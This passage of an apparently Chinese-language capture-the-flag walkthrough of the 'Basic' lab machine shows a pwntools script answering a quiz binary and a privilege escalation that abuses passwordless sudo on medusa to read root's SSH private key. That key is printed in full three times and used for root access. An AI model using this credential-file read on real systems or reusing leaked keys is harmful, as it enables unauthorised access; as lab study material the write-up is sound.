class="hljs-string">───────────────────────────────────</span><br></code></pre></td></tr></table></figure>
+<p>找到密码：<code>jojo</code></p>
+<h3 id="方法二OPT"><a href="#方法二OPT" class="headerlink" title="方法二OPT"></a>方法二OPT</h3><p>在<code>/opt</code>目录下面找到可执行文件<code>jojo</code>，尝试执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnhyk@Basic:/opt$ ./jojo<br>问题 1: 请输入 67+30<br>107<br>错误！<br>问题 2: 请输入 64+74<br>64+74<br>正确！<br>问题 3: 请输入 80+11<br>80+11<br>正确！<br>问题 4: 请输入 76+61<br></code></pre></td></tr></table></figure>
+
+<p>上传一个<code>socat</code>，将文件挂载到端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnhyk@Basic:/tmp$ ./socat TCP-LISTEN:6666,reuseaddr,fork EXEC:/opt/jojo,pty,stderr,setsid<br></code></pre></td></tr></table></figure>
+
+<p>然后写个脚本执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br>r = remote(<span class="hljs-string">&quot;192.168.2.48&quot;</span>, <span class="hljs-number">6666</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>	<span class="hljs-keyword">try</span>:<br>		data = r.recv(timeout=<span class="hljs-number">2</span>).decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>		<span class="hljs-built_in">print</span>(data, end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>		<span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&quot;请输入\s*([\d+\-*/\s]+)&quot;</span>, data)<br>		<span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>			expr = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>).strip()<br>			r.sendline(expr.encode())<br>	<span class="hljs-keyword">except</span> EOFError:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Connection closed.&quot;</span>)<br>		<span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+<p>找到密码<code>jojo</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507091524377.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# ssh jojo@192.168.2.48  <br>jojo@192.168.2.48<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux Basic 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">jojo@Basic:~$ id</span><br><span class="hljs-string">uid=1001(jojo) gid=1001(jojo) groups=1001(jojo)</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="2、获取ROOT权限"><a href="#2、获取ROOT权限" class="headerlink" title="2、获取ROOT权限"></a>2、获取ROOT权限</h2><p>执行<code>sudo -l</code>，发现<code>/usr/bin/medusa</code>可以执行<code>root</code>权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">jojo@Basic:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> jojo on Basic:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User jojo may run the following commands on Basic:<br>    (ALL) NOPASSWD: /usr/bin/medusa<br></code></pre></td></tr></table></figure>
+
+<p>查看使用命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">jojo@Basic:~$ /usr/bin/medusa -h<br>Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;<br><br>/usr/bin/medusa: option requires an argument -- <span class="hljs-string">&#x27;h&#x27;</span><br>CRITICAL: Unknown error processing command-line options.<br>ALERT: Host information must be supplied.<br><br>Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]<br>  -h [TEXT]    : Target hostname or IP address<br>  -H [FILE]    : File containing target hostnames or IP addresses<br>  -u [TEXT]    : Username to <span class="hljs-built_in">test</span><br>  -U [FILE]    : File containing usernames to <span class="hljs-built_in">test</span><br>  -p [TEXT]    : Password to <span class="hljs-built_in">test</span><br>  -P [FILE]    : File containing passwords to <span class="hljs-built_in">test</span><br>  -C [FILE]    : File containing combo entries. See README <span class="hljs-keyword">for</span> more information.<br>  -O [FILE]    : File to append <span class="hljs-built_in">log</span> information to<br>  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)<br>  -M [TEXT]    : Name of the module to execute (without the .mod extension)<br>  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple <span class="hljs-built_in">times</span> with a<br>                 different parameter each <span class="hljs-keyword">time</span> and they will all be sent to the module (i.e.<br>                 -m Param1 -m Param2, etc.)<br>  -d           : Dump all known modules<br>  -n [NUM]     : Use <span class="hljs-keyword">for</span> non-default TCP port number<br>  -s           : Enable SSL<br>  -g [NUM]     : Give up after trying to connect <span class="hljs-keyword">for</span> NUM seconds (default 3)<br>  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)<br>  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.<br>  -c [NUM]     : Time to <span class="hljs-built_in">wait</span> <span class="hljs-keyword">in</span> usec to verify socket is available (default 500 usec).<br>  -t [NUM]     : Total number of logins to be tested concurrently<br>  -T [NUM]     : Total number of hosts to be tested concurrently<br>  -L           : Parallelize logins using one username per thread. The default is to process <br>                 the entire username before proceeding.<br>  -f           : Stop scanning host after first valid username/password found.<br>  -F           : Stop audit after first valid username/password found on any host.<br>  -b           : Suppress startup banner<br>  -q           : Display module<span class="hljs-string">&#x27;s usage information</span><br><span class="hljs-string">  -v [NUM]     : Verbose level [0 - 6 (more)]</span><br><span class="hljs-string">  -w [NUM]     : Error debug level [0 - 10 (more)]</span><br><span class="hljs-string">  -V           : Display version</span><br><span class="hljs-string">  -Z [TEXT]    : Resume scan based on map of previous scan</span><br></code></pre></td></tr></table></figure>
+
+<p>读取<code>root</code>的私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">jojo@Basic:~$ <span class="hljs-built_in">sudo</span> medusa -H /root/.ssh/id_rsa -u root -p root -M ssh<br>Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;<br><br>CRITICAL: Failed to resolve hostname: -----BEGIN OPENSSH PRIVATE KEY----- - Name or service not known<br>CRITICAL: Failed to resolve hostname: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn - Name or service not known<br>CRITICAL: Failed to resolve hostname: NhAAAAAwEAAQAAAYEAuo7fDpWRyh52wo83HNHA5DwnBTEx1Y/hs7jnh5GCIBMxK9kg0A9d - Name or service not known<br>CRITICAL: Failed to resolve hostname: aKHnmsDfnG22fr9ZB3XGDJjZpg86E4MGmzXAQ2FMZfcy0vJ90CIQ4kKrvzj2XvWpu+BkMZ - Name or service not known<br>CRITICAL: Failed to resolve hostname: ibARGcZa0hzOk+RtbFnWGWWOUx0cTtNiEEWx3v43k8ELG1guQ4PU0jIlV6D70F2R9P6tfn - Name or service not known<br>CRITICAL: Failed to resolve hostname: BOxr88YSnSsQu0RErnfg+TR2Vs1EGBpC2vY9yhQOn2X3XeCL2ewznq21DLojMkeW/1lyPn - Name or service not known<br>CRITICAL: Failed to resolve hostname: j/isRTkYXToi+qG+B5KheUtJSGcXb9YMDM4kbCJ0EzRY2lkcZ8Lu8c+6Xyr46nzCKLcx4l - Name or service not known<br>CRITICAL: Failed to resolve hostname: o13VHNraz6nA1gZZJCOhsaX8h7qdDp4bFFAkDEsIEdWJn3oygQ6HuddXfqlJ+lxw6+ANRw - Name or service not known<br>CRITICAL: Failed to resolve hostname: jeGQoLCKj1ut0y5AbFmXvNY+DqaFiQr1YbvuWfm7L2l53ca3HMkK0HytG0o7VzAkyLGUpZ - Name or service not known<br>CRITICAL: Failed to resolve hostname: yv+sF4sspTwdxT7UBt8RVmdOBdU8KhwOgqojj0+rAAAFgCbRPJIm0TySAAAAB3NzaC1yc2 - Name or service not known<br>CRITICAL: Failed to resolve hostname: EAAAGBALqO3w6VkcoedsKPNxzRwOQ8JwUxMdWP4bO454eRgiATMSvZINAPXWih55rA35xt - Name or service not known<br>CRITICAL: Failed to resolve hostname: tn6/WQd1xgyY2aYPOhODBps1wENhTGX3MtLyfdAiEOJCq7849l71qbvgZDGYmwERnGWtIc - Name or service not known<br>CRITICAL: Failed to resolve hostname: zpPkbWxZ1hlljlMdHE7TYhBFsd7+N5PBCxtYLkOD1NIyJVeg+9BdkfT+rX5wTsa/PGEp0r - Name or service not known<br>CRITICAL: Failed to resolve hostname: ELtERK534Pk0dlbNRBgaQtr2PcoUDp9l913gi9nsM56ttQy6IzJHlv9Zcj54/4rEU5GF06 - Name or service not known<br>CRITICAL: Failed to resolve hostname: IvqhvgeSoXlLSUhnF2/WDAzOJGwidBM0WNpZHGfC7vHPul8q+Op8wii3MeJaNd1Rza2s+p - Name or service not known<br>CRITICAL: Failed to resolve hostname: wNYGWSQjobGl/Ie6nQ6eGxRQJAxLCBHViZ96MoEOh7nXV36pSfpccOvgDUcI3hkKCwio9b - Name or service not known<br>CRITICAL: Failed to resolve hostname: rdMuQGxZl7zWPg6mhYkK9WG77ln5uy9ped3GtxzJCtB8rRtKO1cwJMixlKWcr/rBeLLKU8 - Name or service not known<br>CRITICAL: Failed to resolve hostname: HcU+1AbfEVZnTgXVPCocDoKqI49PqwAAAAMBAAEAAAGBALdrFJ9QKqBfxz+Ocw8gotdC1N - Name or service not known<br>CRITICAL: Failed to resolve hostname: JkBa0E41FB8FD3nMpQVD3aIkqtcJcY547dJnyz2YNQOgX9oxRri0GbIuxgHDSpajhVBzoR - Name or service not known<br>CRITICAL: Failed to resolve hostname: CqUfyNbDR3pNNnKxXHkMay7OdXPVqEAqwmutBthiUdpv+qa7dYg8/vhQ9zAK0i+LhXlOju - Name or service not known<br>CRITICAL: Failed to resolve hostname: GS9vST0T9kAbEV/QZQP9my0W4Bi57pm1F3YoGn/7E+c5BdSJF7JQY+lj5kQ2roQuPVSHMr - Name or service not known<br>CRITICAL: Failed to resolve hostname: W0OvK5C8jBvsiV7T+xrKClt9OEseNufcUUA5iaKI+G4qwx3znjt548FxxF6q2Jlp5pEThP - Name or service not known<br>CRITICAL: Failed to resolve hostname: AMBPFQvb99HL3MNF/paO2lczp9Jl5puiHOAUBF7lAgGsIYPU3wo5GaWl3IEYnfn7lXziB8 - Name or service not known<br>CRITICAL: Failed to resolve hostname: iVkP0K/gx4yauF159H4IMP7pmh0rDRxLdW2h2GCc2vspJpD9mQ8dBemG+6fUHTJzfgFwR0 - Name or service not known<br>CRITICAL: Failed to resolve hostname: eTHDHJtzj5q5yK4g/5zaRS8+Vx4iTBYw/aBzWr1WkP4OkmLWyx6NZXzEkw/MxdJyF/oQAA - Name or service not known<br>CRITICAL: Failed to resolve hostname: AMAchGFcfzr4d/Rv+Q1eaFzNVGFVAmiW2H2Sz9lOZAXw/jARJww9B3Zg3M9q+b5w4SVMeQ - Name or service not known<br>CRITICAL: Failed to resolve hostname: HJYjgWPy97/KkQZR5U4MC8Ds7zyQY3AhlqJvcDIZeTFMXt44qWmaKiQy2KciVIW30+UAtO - Name or service not known<br>CRITICAL: Failed to resolve hostname: GOBqPoykzbwgLmh5hJmQGpgzssgMhOM7hIcRMP/Ymhsyw8ok9++FEqSN9mUiXSGR7WbGke - Name or service not known<br>CRITICAL: Failed to resolve hostname: esb99CYOsc7YCJ0EeZJJEhQIxwFg094NDCjK83j5yOrDssfNIAAADBAN83PifBNXGdRFN0 - Name or service not known<br>CRITICAL: Failed to resolve hostname: nF5r4QSW1wDQ0CHHOZt0zXYbpjyxASFhtTWfEci5AXWz9jL4qFCLBx77jNfabalhRPlz8E - Name or service not known<br>CRITICAL: Failed to resolve hostname: 8Gavf8rssqD8+ZcHr/bAPSlfxY9Q+5L6FKAdKl7x70qNiYp7btyAuGFWKfn+lH4sSFCVBA - Name or service not known<br>CRITICAL: Failed to resolve hostname: MSDsXSQvL5bB6CGFLASboZJLNYO+0iYJ5nGZch+B3HQQ+sk52A3ipR5Om1Trk+ZelV5iH7 - Name or service not known<br>CRITICAL: Failed to resolve hostname: uMDrSz1Co+0ozDPmfvo9PGrttYqmPpaQAAAMEA1fVTHfJmX8vv4IGthLzeWaosc90bjiMY - Name or service not known<br>CRITICAL: Failed to resolve hostname: 70FX+KImdoi26V61rccY2IBL6X4KffrL1jTuET12czbwGgZh3KpHbFrXNsc/jxV+sUKVJa - Name or service not known<br>CRITICAL: Failed to resolve hostname: aKLFd+UNjg756RvevzBMXr5c9ewE6hcdNiwKDBxkBqSbuiBr+oeSMg0G4ppwCGg+G0lBd/ - Name or service not known<br>CRITICAL: Failed to resolve hostname: ltoRV5MXeIxoYZ6B/jrAbc/Y9kQZ0ozcoSe3zMViGiY++TQf2TPkhiBvu8bRY4vy19nl1c - Name or service not known<br>CRITICAL: Failed to resolve hostname: mM/HtQ/t5mUZnzAAAACnJvb3RAQmFzaWM= - Name or service not known<br>CRITICAL: Failed to resolve hostname: -----END OPENSSH PRIVATE KEY----- - Name or service not known<br></code></pre></td></tr></table></figure>
+
+<p>处理一下私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# <span class="hljs-built_in">cat</span> tmp | awk <span class="hljs-string">&#x27;&#123;print $6&#125;&#x27;</span><br>-----BEGIN<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAuo7fDpWRyh52wo83HNHA5DwnBTEx1Y/hs7jnh5GCIBMxK9kg0A9d<br>aKHnmsDfnG22fr9ZB3XGDJjZpg86E4MGmzXAQ2FMZfcy0vJ90CIQ4kKrvzj2XvWpu+BkMZ<br>ibARGcZa0hzOk+RtbFnWGWWOUx0cTtNiEEWx3v43k8ELG1guQ4PU0jIlV6D70F2R9P6tfn<br>BOxr88YSnSsQu0RErnfg+TR2Vs1EGBpC2vY9yhQOn2X3XeCL2ewznq21DLojMkeW/1lyPn<br>j/isRTkYXToi+qG+B5KheUtJSGcXb9YMDM4kbCJ0EzRY2lkcZ8Lu8c+6Xyr46nzCKLcx4l<br>o13VHNraz6nA1gZZJCOhsaX8h7qdDp4bFFAkDEsIEdWJn3oygQ6HuddXfqlJ+lxw6+ANRw<br>jeGQoLCKj1ut0y5AbFmXvNY+DqaFiQr1YbvuWfm7L2l53ca3HMkK0HytG0o7VzAkyLGUpZ<br>yv+sF4sspTwdxT7UBt8RVmdOBdU8KhwOgqojj0+rAAAFgCbRPJIm0TySAAAAB3NzaC1yc2<br>EAAAGBALqO3w6VkcoedsKPNxzRwOQ8JwUxMdWP4bO454eRgiATMSvZINAPXWih55rA35xt<br>tn6/WQd1xgyY2aYPOhODBps1wENhTGX3MtLyfdAiEOJCq7849l71qbvgZDGYmwERnGWtIc<br>zpPkbWxZ1hlljlMdHE7TYhBFsd7+N5PBCxtYLkOD1NIyJVeg+9BdkfT+rX5wTsa/PGEp0r<br>ELtERK534Pk0dlbNRBgaQtr2PcoUDp9l913gi9nsM56ttQy6IzJHlv9Zcj54/4rEU5GF06<br>IvqhvgeSoXlLSUhnF2/WDAzOJGwidBM0WNpZHGfC7vHPul8q+Op8wii3MeJaNd1Rza2s+p<br>wNYGWSQjobGl/Ie6nQ6eGxRQJAxLCBHViZ96MoEOh7nXV36pSfpccOvgDUcI3hkKCwio9b<br>rdMuQGxZl7zWPg6mhYkK9WG77ln5uy9ped3GtxzJCtB8rRtKO1cwJMixlKWcr/rBeLLKU8<br>HcU+1AbfEVZnTgXVPCocDoKqI49PqwAAAAMBAAEAAAGBALdrFJ9QKqBfxz+Ocw8gotdC1N<br>JkBa0E41FB8FD3nMpQVD3aIkqtcJcY547dJnyz2YNQOgX9oxRri0GbIuxgHDSpajhVBzoR<br>CqUfyNbDR3pNNnKxXHkMay7OdXPVqEAqwmutBthiUdpv+qa7dYg8/vhQ9zAK0i+LhXlOju<br>GS9vST0T9kAbEV/QZQP9my0W4Bi57pm1F3YoGn/7E+c5BdSJF7JQY+lj5kQ2roQuPVSHMr<br>W0OvK5C8jBvsiV7T+xrKClt9OEseNufcUUA5iaKI+G4qwx3znjt548FxxF6q2Jlp5pEThP<br>AMBPFQvb99HL3MNF/paO2lczp9Jl5puiHOAUBF7lAgGsIYPU3wo5GaWl3IEYnfn7lXziB8<br>iVkP0K/gx4yauF159H4IMP7pmh0rDRxLdW2h2GCc2vspJpD9mQ8dBemG+6fUHTJzfgFwR0<br>eTHDHJtzj5q5yK4g/5zaRS8+Vx4iTBYw/aBzWr1WkP4OkmLWyx6NZXzEkw/MxdJyF/oQAA<br>AMAchGFcfzr4d/Rv+Q1eaFzNVGFVAmiW2H2Sz9lOZAXw/jARJww9B3Zg3M9q+b5w4SVMeQ<br>HJYjgWPy97/KkQZR5U4MC8Ds7zyQY3AhlqJvcDIZeTFMXt44qWmaKiQy2KciVIW30+UAtO<br>GOBqPoykzbwgLmh5hJmQGpgzssgMhOM7hIcRMP/Ymhsyw8ok9++FEqSN9mUiXSGR7WbGke<br>esb99CYOsc7YCJ0EeZJJEhQIxwFg094NDCjK83j5yOrDssfNIAAADBAN83PifBNXGdRFN0<br>nF5r4QSW1wDQ0CHHOZt0zXYbpjyxASFhtTWfEci5AXWz9jL4qFCLBx77jNfabalhRPlz8E<br>8Gavf8rssqD8+ZcHr/bAPSlfxY9Q+5L6FKAdKl7x70qNiYp7btyAuGFWKfn+lH4sSFCVBA<br>MSDsXSQvL5bB6CGFLASboZJLNYO+0iYJ5nGZch+B3HQQ+sk52A3ipR5Om1Trk+ZelV5iH7<br>uMDrSz1Co+0ozDPmfvo9PGrttYqmPpaQAAAMEA1fVTHfJmX8vv4IGthLzeWaosc90bjiMY<br>70FX+KImdoi26V61rccY2IBL6X4KffrL1jTuET12czbwGgZh3KpHbFrXNsc/jxV+sUKVJa<br>aKLFd+UNjg756RvevzBMXr5c9ewE6hcdNiwKDBxkBqSbuiBr+oeSMg0G4ppwCGg+G0lBd/<br>ltoRV5MXeIxoYZ6B/jrAbc/Y9kQZ0ozcoSe3zMViGiY++TQf2TPkhiBvu8bRY4vy19nl1c<br>mM/HtQ/t5mUZnzAAAACnJvb3RAQmFzaWM=<br>-----END<br></code></pre></td></tr></table></figure>
+
+<p>得到完整的私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAuo7fDpWRyh52wo83HNHA5DwnBTEx1Y/hs7jnh5GCIBMxK9kg0A9d<br>aKHnmsDfnG22fr9ZB3XGDJjZpg86E4MGmzXAQ2FMZfcy0vJ90CIQ4kKrvzj2XvWpu+BkMZ<br>ibARGcZa0hzOk+RtbFnWGWWOUx0cTtNiEEWx3v43k8ELG1guQ4PU0jIlV6D70F2R9P6tfn<br>BOxr88YSnSsQu0RErnfg+TR2Vs1EGBpC2vY9yhQOn2X3XeCL2ewznq21DLojMkeW/1lyPn<br>j/isRTkYXToi+qG+B5KheUtJSGcXb9YMDM4kbCJ0EzRY2lkcZ8Lu8c+6Xyr46nzCKLcx4l<br>o13VHNraz6nA1gZZJCOhsaX8h7qdDp4bFFAkDEsIEdWJn3oygQ6HuddXfqlJ+lxw6+ANRw<br>jeGQoLCKj1ut0y5AbFmXvNY+DqaFiQr1YbvuWfm7L2l53ca3HMkK0HytG0o7VzAkyLGUpZ<br>yv+sF4sspTwdxT7UBt8RVmdOBdU8KhwOgqojj0+rAAAFgCbRPJIm0TySAAAAB3NzaC1yc2<br>EAAAGBALqO3w6VkcoedsKPNxzRwOQ8JwUxMdWP4bO454eRgiATMSvZINAPXWih55rA35xt<br>tn6/WQd1xgyY2aYPOhODBps1wENhTGX3MtLyfdAiEOJCq7849l71qbvgZDGYmwERnGWtIc<br>zpPkbWxZ1hlljlMdHE7TYhBFsd7+N5PBCxtYLkOD1NIyJVeg+9BdkfT+rX5wTsa/PGEp0r<br>ELtERK534Pk0dlbNRBgaQtr2PcoUDp9l913gi9nsM56ttQy6IzJHlv9Zcj54/4rEU5GF06<br>IvqhvgeSoXlLSUhnF2/WDAzOJGwidBM0WNpZHGfC7vHPul8q+Op8wii3MeJaNd1Rza2s+p<br>wNYGWSQjobGl/Ie6nQ6eGxRQJAxLCBHViZ96MoEOh7nXV36pSfpccOvgDUcI3hkKCwio9b<br>rdMuQGxZl7zWPg6mhYkK9WG77ln5uy9ped3GtxzJCtB8rRtKO1cwJMixlKWcr/rBeLLKU8<br>HcU+1AbfEVZnTgXVPCocDoKqI49PqwAAAAMBAAEAAAGBALdrFJ9QKqBfxz+Ocw8gotdC1N<br>JkBa0E41FB8FD3nMpQVD3aIkqtcJcY547dJnyz2YNQOgX9oxRri0GbIuxgHDSpajhVBzoR<br>CqUfyNbDR3pNNnKxXHkMay7OdXPVqEAqwmutBthiUdpv+qa7dYg8/vhQ9zAK0i+LhXlOju<br>GS9vST0T9kAbEV/QZQP9my0W4Bi57pm1F3YoGn/7E+c5BdSJF7JQY+lj5kQ2roQuPVSHMr<br>W0OvK5C8jBvsiV7T+xrKClt9OEseNufcUUA5iaKI+G4qwx3znjt548FxxF6q2Jlp5pEThP<br>AMBPFQvb99HL3MNF/paO2lczp9Jl5puiHOAUBF7lAgGsIYPU3wo5GaWl3IEYnfn7lXziB8<br>iVkP0K/gx4yauF159H4IMP7pmh0rDRxLdW2h2GCc2vspJpD9mQ8dBemG+6fUHTJzfgFwR0<br>eTHDHJtzj5q5yK4g/5zaRS8+Vx4iTBYw/aBzWr1WkP4OkmLWyx6NZXzEkw/MxdJyF/oQAA<br>AMAchGFcfzr4d/Rv+Q1eaFzNVGFVAmiW2H2Sz9lOZAXw/jARJww9B3Zg3M9q+b5w4SVMeQ<br>HJYjgWPy97/KkQZR5U4MC8Ds7zyQY3AhlqJvcDIZeTFMXt44qWmaKiQy2KciVIW30+UAtO<br>GOBqPoykzbwgLmh5hJmQGpgzssgMhOM7hIcRMP/Ymhsyw8ok9++FEqSN9mUiXSGR7WbGke<br>esb99CYOsc7YCJ0EeZJJEhQIxwFg094NDCjK83j5yOrDssfNIAAADBAN83PifBNXGdRFN0<br>nF5r4QSW1wDQ0CHHOZt0zXYbpjyxASFhtTWfEci5AXWz9jL4qFCLBx77jNfabalhRPlz8E<br>8Gavf8rssqD8+ZcHr/bAPSlfxY9Q+5L6FKAdKl7x70qNiYp7btyAuGFWKfn+lH4sSFCVBA<br>MSDsXSQvL5bB6CGFLASboZJLNYO+0iYJ5nGZch+B3HQQ+sk52A3ipR5Om1Trk+ZelV5iH7<br>uMDrSz1Co+0ozDPmfvo9PGrttYqmPpaQAAAMEA1fVTHfJmX8vv4IGthLzeWaosc90bjiMY<br>70FX+KImdoi26V61rccY2IBL6X4KffrL1jTuET12czbwGgZh3KpHbFrXNsc/jxV+sUKVJa<br>aKLFd+UNjg756RvevzBMXr5c9ewE6hcdNiwKDBxkBqSbuiBr+oeSMg0G4ppwCGg+G0lBd/<br>ltoRV5MXeIxoYZ6B/jrAbc/Y9kQZ0ozcoSe3zMViGiY++TQf2TPkhiBvu8bRY4vy19nl1c<br>mM/HtQ/t5mUZnzAAAACnJvb3RAQmFzaWM=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<p>获得ROOT权限</p>
